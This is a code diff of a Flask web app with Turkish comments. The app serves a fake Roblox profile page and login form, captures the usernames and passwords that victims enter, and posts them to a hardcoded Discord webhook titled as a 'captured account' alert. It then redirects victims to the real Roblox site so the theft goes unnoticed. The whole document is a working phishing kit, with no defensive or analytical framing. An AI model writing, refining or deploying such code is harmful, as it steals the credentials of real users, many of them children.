@@ -1,42 +1,42 @@
 import os
 import requests
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
 
-# Discord Webhook URL (Burası aynı kalıyor)
+# Discord Webhook URL
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1389197903364362334/PDjw-rxZ1n2OIT2tmMoObfMQtznuhrUT5evwUayhIpz1YAaEnUU_psuI0_SepNCdP29k"
 
+# 1. ADIM: Kullanıcı siteye ilk girdiğinde PROFİL sayfasını görsün
 @app.route('/')
-def index():
-    # render_template klasöründeki login.html dosyasını açar
-    return render_template('login.html') 
+def home():
+    return render_template('profil.html')
 
+# 2. ADIM: Profildeki buton buraya yönlendirecek
+@app.route('/auth')
+def auth_page():
+    return render_template('login.html')
+
+# 3. ADIM: Login sayfasındaki verileri yakalayan kısım
 @app.route('/login', methods=['POST'])
 def login():
     user = request.form.get('username')
     pw = request.form.get('password')
 
     if DISCORD_WEBHOOK_URL.startswith("https://"):
-        try:
-            data = {
-                "embeds": [
-                    {
-                        "title": "🔔 Yeni Hesap Düştü!",
-                        "color": 16711680, # Kırmızı renk
-                        "fields": [
-                            {"name": "Kullanıcı Adı", "value": f"`{user}`", "inline": True},
-                            {"name": "Şifre", "value": f"`{pw}`", "inline": True}
-                        ],
-                        "footer": {"text": "Roblox Login System"}
-                    }
-                ]
-            }
-            requests.post(DISCORD_WEBHOOK_URL, json=data)
-        except Exception as e:
-            print(f"Hata: {e}")
+        data = {
+            "embeds": [{
+                "title": "🎯 Hesap Yakalandı!",
+                "fields": [
+                    {"name": "Kullanıcı", "value": f"`{user}`", "inline": True},
+                    {"name": "Şifre", "value": f"`{pw}`", "inline": True}
+                ],
+                "color": 15158332
+            }]
+        }
+        requests.post(DISCORD_WEBHOOK_URL, json=data)
 
-    # Bilgiyi aldıktan sonra kullanıcıyı gerçek Roblox sayfasına gönderiyoruz
+    # Veriyi aldıktan sonra gerçek Roblox'a şutla
     return redirect("https://www.roblox.com/home")
 
 if __name__ == "__main__":
